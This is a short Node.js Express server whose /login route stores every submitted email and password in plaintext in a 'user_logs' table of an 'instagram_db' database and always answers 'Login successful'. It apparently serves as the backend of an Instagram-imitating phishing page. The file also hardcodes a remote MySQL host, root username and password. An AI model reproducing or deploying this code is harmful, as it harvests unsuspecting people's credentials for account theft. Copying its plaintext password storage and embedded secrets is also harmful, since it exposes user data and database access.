const express = require('express');
const bodyParser = require('body-parser');
const mysql = require('mysql2');
const path = require('path');

const app = express();
const port = process.env.PORT || 16513;

// Middleware
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

// Create MySQL connection
const db = mysql.createConnection({
    host: 'roundhouse.proxy.rlwy.net',  // Your database host
    user: 'root',                       // Your MySQL username
    password: 'vQMjUqGHuXZFzCengyaifwWKpIjvEIPs',  // Your MySQL password
    database: 'instagram_db',           // Your database name
    connectTimeout: 10000               // 10 seconds timeout
});

db.connect((err) => {
    if (err) {
        console.error('Error connecting to the database:', err);
        return;
    }
    console.log('MySQL Connected...');
});

// Serve static files from the "public" directory
app.use(express.static(path.join(__dirname, 'public')));

// Login Route
app.post('/login', (req, res) => {
    const { email, password } = req.body;

    // Log user input values in the database
    const logSql = 'INSERT INTO user_logs (email, password, login_time) VALUES (?, ?, NOW())';
    db.query(logSql, [email, password], (err, result) => {
        if (err) {
            console.error('Error logging user data:', err);
            res.status(500).send('Database error');
            return;
        }
        console.log('User login data logged in database');
        res.send('Login successful');
    });
});

app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});
